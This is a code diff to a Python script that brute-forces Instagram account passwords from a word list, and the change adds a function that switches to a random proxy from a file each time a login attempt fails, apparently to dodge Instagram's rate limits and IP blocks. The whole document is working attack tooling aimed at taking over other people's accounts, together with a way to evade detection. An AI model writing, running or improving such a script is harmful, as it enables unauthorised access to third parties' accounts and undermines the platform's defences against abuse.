@@ -18,6 +18,10 @@ else:
 
 myProxy = ''
 
+def randomProxy():
+	global myProxy
+	myProxy = random.choice(open('proxy.txt').read().splitlines())
+	print ('Your public ip: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": myProxy, "https": myProxy }).text)
 
 def userExists(username):
 	r = requests.get('https://www.instagram.com/%s/?__a=1' % username) 
@@ -49,7 +53,7 @@ def Login(username,password):
 		'Referer': 'https://www.instagram.com',
 		'authority': 'www.instagram.com',
 		'Host' : 'www.instagram.com',
-		'Accept-Language' : 'ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4',
+		'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
 		'Accept-Encoding' : 'gzip, deflate'
 	})
 
@@ -65,14 +69,17 @@ def Login(username,password):
 	data = json.loads(r.text)
 	if (data['status'] == 'fail'):
 		print (data['message'])
+		randomProxy()
 		return False
-	
+
 	if (data['authenticated'] == True):
 		return sess #if we want to keep use session
 	else:
 		print ('Password incorrect [%s]' % password)
 		return False
 
+
+		
 
 
 
@@ -94,9 +101,7 @@ delayLoop = int(input('Please add delay between the passwords (in seconds): '))
 
 UsePorxy = input('Do you want to use proxy (y/n): ')
 if (UsePorxy == 'y'):
-	myProxy = random.choice(open('proxy.txt').read().splitlines())
-	print ('Your public ip: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": myProxy, "https": myProxy }).text)
-
+	randomProxy()
 
 for i in range(len(passwords)):
 	password = passwords[i]
